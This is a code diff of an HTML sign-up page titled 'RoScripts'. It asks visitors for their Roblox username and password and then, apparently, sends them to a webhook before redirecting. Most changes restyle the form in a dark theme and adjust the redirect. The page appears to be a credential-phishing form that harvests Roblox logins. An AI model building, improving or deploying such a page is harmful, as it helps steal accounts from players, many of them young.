@@ -3,34 +3,38 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kayıt Ol</title>
+  <title>Kayıt Ol - RoScripts</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
+      background-color: #111; /* Siyah arka plan */
+      color: white;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      margin: 0;
+      flex-direction: column;
     }
 
     .form-container {
-      background: #fff;
-      padding: 20px;
+      background-color: #2c2f38;
+      padding: 30px;
       border-radius: 10px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-      width: 300px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      width: 350px;
     }
 
     h1 {
+      font-size: 26px;
       text-align: center;
       margin-bottom: 20px;
-      font-size: 24px;
+      font-weight: bold;
     }
 
     label {
-      font-size: 16px;
+      font-size: 14px;
       margin-bottom: 5px;
       display: block;
     }
@@ -38,10 +42,12 @@
     input {
       width: 100%;
       padding: 10px;
-      margin-bottom: 15px;
+      margin-bottom: 20px;
       font-size: 16px;
-      border: 1px solid #ccc;
+      border: 1px solid #333;
       border-radius: 5px;
+      background-color: #444;
+      color: white;
     }
 
     button {
@@ -70,10 +76,10 @@
     <h1>Roblox Hesabınızla Kayıt Olun</h1>
     <form id="register-form">
       <label for="username">Kullanıcı Adı:</label>
-      <input type="text" id="username" name="username" required><br><br>
+      <input type="text" id="username" name="username" required><br>
 
       <label for="password">Şifre:</label>
-      <input type="password" id="password" name="password" required><br><br>
+      <input type="password" id="password" name="password" required><br>
 
       <button type="submit">Kayıt Ol</button>
     </form>
@@ -104,7 +110,7 @@
       .then(() => {
         // Başarıyla gönderildiğinde, kullanıcıyı ana sayfaya yönlendirme ve login durumunu kaydetme
         localStorage.setItem('userLoggedIn', 'true');
-        window.location.href = 'index.html'; // Giriş yaptıktan sonra ana sayfaya yönlendir
+        window.location.href = '/index.html'; // Kayıt sonrası ana sayfaya yönlendir
       })
       .catch(error => {
         console.error('Webhook hatası:', error);
